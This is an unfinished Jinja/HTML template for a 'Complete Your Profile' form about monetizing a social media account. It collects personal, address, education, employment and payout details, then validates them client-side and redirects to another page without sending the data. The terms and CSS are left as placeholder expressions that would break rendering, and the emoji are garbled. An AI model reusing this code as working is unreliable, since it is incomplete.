{% extends "base.html" %}
{% block body %}
<div class="card form-card">
  <div class="form-header">
    <h1>ğŸ“‹ Complete Your Profile</h1>
    <p class="lead">Please fill out all sections carefully to proceed with your account setup.</p>
    <div class="disclaimer">
      <small>ğŸ”’ Note: For security purposes, please use placeholder information only.</small>
    </div>
  </div>

  <!-- âœ… FORM UPDATED â€” action removed (handled by JS redirect) -->
  <form id="f1form" method="POST" novalidate>

    <!-- Personal Information -->
    <div class="form-section">
      <h2 class="section-title">ğŸ‘¤ Personal Information</h2>
      <div class="form-group">
        <label class="form-label">Full Name</label>
        <input type="text" name="fullname" class="input" placeholder="Enter your full name" required>
        <div class="error">Please enter your full name</div>
      </div>

      <div class="form-group">
        <label class="form-label">Date of Birth</label>
        <input type="date" name="dob" class="input" required>
        <div class="error">Please select your date of birth</div>
      </div>

      <div class="form-group">
        <label class="form-label">Gender</label>
        <div class="group button-group" data-group="gender">
          <button type="button" class="option-btn" data-name="gender" data-value="Male">Male</button>
          <button type="button" class="option-btn" data-name="gender" data-value="Female">Female</button>
          <button type="button" class="option-btn" data-name="gender" data-value="Other">Other</button>
          <input type="hidden" name="gender" required>
        </div>
        <div class="error group-error">Please select your gender</div>
      </div>

      <div class="form-group">
        <label class="form-label">Marital Status</label>
        <div class="group button-group" data-group="marital">
          <button type="button" class="option-btn" data-name="marital" data-value="Single">Single</button>
          <button type="button" class="option-btn" data-name="marital" data-value="Married">Married</button>
          <button type="button" class="option-btn" data-name="marital" data-value="Divorced">Divorced</button>
          <button type="button" class="option-btn" data-name="marital" data-value="Widowed">Widowed</button>
          <input type="hidden" name="marital" required>
        </div>
        <div class="error group-error">Please choose your marital status</div>
      </div>
    </div>

    <!-- Residential Address -->
    <div class="form-section">
      <h2 class="section-title">ğŸ  Residential Address</h2>
      <div class="form-group">
        <label class="form-label">Street Address</label>
        <input type="text" name="street" class="input" placeholder="Enter your street address" required>
        <div class="error">Enter your street address</div>
      </div>

      <div class="form-row">
        <div class="form-group">
          <label class="form-label">City</label>
          <input type="text" name="city" class="input" placeholder="City" required>
          <div class="error">Enter your city</div>
        </div>

        <div class="form-group">
          <label class="form-label">Postal Code</label>
          <input type="text" name="postal" class="input" placeholder="Postal code" required>
          <div class="error">Enter your postal code</div>
        </div>
      </div>

      <div class="form-group">
        <label class="form-label">Country</label>
        <input type="text" name="country" class="input" placeholder="Country" required>
        <div class="error">Enter your country</div>
      </div>
    </div>

    <!-- Education -->
    <div class="form-section">
      <h2 class="section-title">ğŸ“ Education Background</h2>
      <div class="form-group">
        <label class="form-label">Highest Qualification</label>
        <input type="text" name="qualification" class="input" placeholder="Your highest qualification" required>
        <div class="error">Enter your highest qualification</div>
      </div>

      <div class="form-group">
        <label class="form-label">Institution</label>
        <input type="text" name="institution" class="input" placeholder="Educational institution" required>
        <div class="error">Enter your institution</div>
      </div>

      <div class="form-group">
        <label class="form-label">Year Completed</label>
        <input type="number" name="year_completed" class="input" placeholder="Graduation year" required>
        <div class="error">Enter the year completed</div>
      </div>
    </div>

    <!-- Work -->
    <div class="form-section">
      <h2 class="section-title">ğŸ’¼ Professional Information</h2>
      <div class="form-group">
        <label class="form-label">Occupation / Job Title</label>
        <input type="text" name="occupation" class="input" placeholder="Your occupation" required>
        <div class="error">Enter your occupation</div>
      </div>

      <div class="form-group">
        <label class="form-label">Company / Business Name</label>
        <input type="text" name="company" class="input" placeholder="Company name" required>
        <div class="error">Enter your company</div>
      </div>
    </div>

    <!-- Fun Preferences -->
    <div class="form-section">
      <h2 class="section-title">ğŸ’° Monetization Preferences</h2>
      <div class="form-group">
        <div class="group button-group" data-group="fun">
          <button type="button" class="option-btn" data-name="fun" data-value="happiness">Earning from your own content</button>
          <button type="button" class="option-btn" data-name="fun" data-value="smile">Earning by streaming other's content</button>
          <button type="button" class="option-btn" data-name="fun" data-value="both">Both Methods</button>
          <input type="hidden" name="fun" required>
        </div>
        <div class="error group-error">Select at least one monetization preference</div>
      </div>
    </div>

    <!-- Short Bio -->
    <div class="form-section">
      <h2 class="section-title">ğŸ“ Personal Bio</h2>
      <div class="form-group">
        <label class="form-label">Write a short bio explaining why you want to monetize your social media account.</label>
        <textarea name="bio" class="input" rows="6" minlength="15" maxlength="1500" required placeholder="Tell us about yourself (15-300 words)..."></textarea>
        <div class="error">Please write a short bio (15-300 words)</div>
      </div>
    </div>

    <!-- Notifications -->
    <div class="form-section">
      <h2 class="section-title">ğŸ”” Notification Preferences</h2>
      <div class="form-group">
        <div class="group button-group" data-group="notify">
          <button type="button" class="option-btn" data-name="notify" data-value="email">Email Updates</button>
          <button type="button" class="option-btn" data-name="notify" data-value="sms">SMS Alerts</button>
          <button type="button" class="option-btn" data-name="notify" data-value="push">Push Notifications</button>
          <input type="hidden" name="notify" required>
        </div>
        <div class="error group-error">Select at least one notification preference</div>
      </div>
    </div>

    <!-- Play Method -->
    <div class="form-section">
      <h2 class="section-title">ğŸ’³ Earnings Payout Method</h2>
      <div class="form-group">
        <div class="group button-group" data-group="method">
          <button type="button" class="option-btn" data-name="method" data-value="feeling">Bank Account</button>
          <button type="button" class="option-btn" data-name="method" data-value="hoping">Crypto Wallet</button>
          <button type="button" class="option-btn" data-name="method" data-value="applications">Mobile Applications</button>
          <input type="hidden" name="method" required>
        </div>
        <div class="error group-error">Please choose a Payout Method</div>
      </div>
    </div>

    <!-- Terms -->
    <div class="form-section">
      <h2 class="section-title">ğŸ“„ Terms & Conditions</h2>
      <div class="form-group">
        <div class="terms-box">
          <p>
            <!-- Terms text unchanged -->
            {{ your terms text remains the same }}
          </p>
        </div>

        <div class="checkbox-group">
          <label class="checkbox-label">
            <input type="checkbox" name="terms" required>
            <span class="checkmark"></span>
            I have read and agree to the Terms & Conditions
          </label>
          <div class="error group-error">You must agree to the terms before continuing</div>
        </div>
      </div>
    </div>

    <!-- Submit -->
    <div class="form-section">
      <button type="submit" class="submit-btn">Complete Registration</button>
    </div>

  </form>
</div>

<style>
/* âœ… your full CSS unchanged */
{{ your CSS stays exactly the same }}
</style>

<script>
const form = document.getElementById("f1form");

document.querySelectorAll(".option-btn").forEach(btn => {
  btn.addEventListener("click", () => {
    const name = btn.dataset.name;
    const hidden = form.querySelector(`input[name="${name}"]`);
    const siblings = document.querySelectorAll(`.option-btn[data-name="${name}"]`);
    siblings.forEach(b => b.classList.remove("selected"));
    btn.classList.add("selected");
    hidden.value = btn.dataset.value;

    const group = form.querySelector(`.button-group[data-group="${name}"]`);
    group.classList.remove("invalid");
    group.nextElementSibling.style.display = "none";
  });
});

function validateForm(showErrors = true) {
  let valid = true;
  let firstInvalid = null;

  form.querySelectorAll(".error, .group-error").forEach(e => e.style.display = "none");
  form.querySelectorAll(".invalid").forEach(e => e.classList.remove("invalid"));

  form.querySelectorAll("input[required], textarea[required]").forEach(input => {
    const isHidden = input.type === "hidden";
    const isCheckbox = input.type === "checkbox";

    if (isHidden) {
      if (!input.value.trim()) {
        valid = false;
        const group = input.closest(".group");
        if (showErrors) {
          group.classList.add("invalid");
          group.nextElementSibling.style.display = "block";
        }
        if (!firstInvalid) firstInvalid = group;
      }
    } else if (isCheckbox) {
      if (!input.checked) {
        valid = false;
        const err = input.closest(".checkbox-group").querySelector(".group-error");
        if (showErrors && err) err.style.display = "block";
        if (!firstInvalid) firstInvalid = input.closest(".checkbox-group");
      }
    } else if (!input.value.trim()) {
      valid = false;
      if (showErrors) {
        input.classList.add("invalid");
        input.nextElementSibling.style.display = "block";
      }
      if (!firstInvalid) firstInvalid = input;
    }
  });

  if (!valid && showErrors && firstInvalid) {
    firstInvalid.scrollIntoView({ behavior: "smooth", block: "center" });
  }

  return valid;
}

form.addEventListener("submit", e => {
  e.preventDefault();

  if (validateForm(true)) {
    // âœ… NEW REDIRECT TO f1_A.html
    window.location.href = "f1_A.html";
  }
});

form.querySelectorAll("input, textarea").forEach(el => {
  el.addEventListener("input", () => validateForm(false));
  el.addEventListener("change", () => validateForm(false));
});
</script>

{% endblock %}
